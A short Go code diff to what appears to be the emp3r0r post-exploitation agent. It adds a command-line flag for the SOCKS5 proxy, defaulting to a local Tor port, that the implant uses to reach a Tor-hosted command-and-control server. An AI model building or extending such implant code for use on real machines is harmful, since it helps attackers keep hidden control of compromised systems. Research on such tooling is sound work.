@@ -1,6 +1,7 @@
 package main
 
 import (
+	"flag"
 	"fmt"
 	"log"
 	"os"
@@ -50,11 +51,17 @@ func main() {
 		agent.CCAddress += "/"
 	}
 
+	c2proxy := flag.String("proxy", "socks5://127.0.0.1:9050", "Proxy for emp3r0r agent's C2 communication")
+	flag.Parse()
+
 	// if CC is behind tor, a proxy is needed
 	agent.HTTPClient = tun.EmpHTTPClient("")
 	if tun.IsTor(agent.CCAddress) {
 		log.Printf("CC is on TOR: %s", agent.CCAddress)
-		agent.HTTPClient = tun.EmpHTTPClient("socks5://127.0.0.1:9050")
+		if *c2proxy == "" {
+			log.Fatalf("CC is on TOR (%s), you have to specify a tor proxy for it to work", agent.CCAddress)
+		}
+		agent.HTTPClient = tun.EmpHTTPClient(*c2proxy)
 	}
 connect:
 
